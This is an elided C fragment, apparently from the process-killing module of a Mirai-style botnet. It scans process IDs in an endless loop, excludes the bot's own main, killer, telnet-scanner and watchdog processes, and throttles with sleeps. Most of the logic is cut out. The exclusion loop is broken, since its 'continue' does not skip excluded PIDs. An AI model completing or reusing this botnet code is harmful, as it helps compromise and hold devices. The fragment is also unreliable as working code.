    ...
    while(TRUE)
    {
        ...
        while((file = readdir(dir)) != NULL)
        {
            ...
            if(pid <= killer_highest_pid)
            {
                ...
                {
                    int sleep_duration = system_load() < 0.5 ? 0 : 1;
            ...
            int excluded_pids[] = {getpid(), getppid(), main_pid1, main_pid2, killer_pid, tel_pid, watch_pid};
            size_t num_excluded = sizeof(excluded_pids) / sizeof(int);

            for (size_t i = 0; i < num_excluded; i++) {
                if (pid == excluded_pids[i]) {
                    continue;
                }
            }
            ...
            if (++sleep_counter >= 10) { // performance IO tree snoop addition for funnys
                sleep(1);
                sleep_counter = 0;
            }
        }
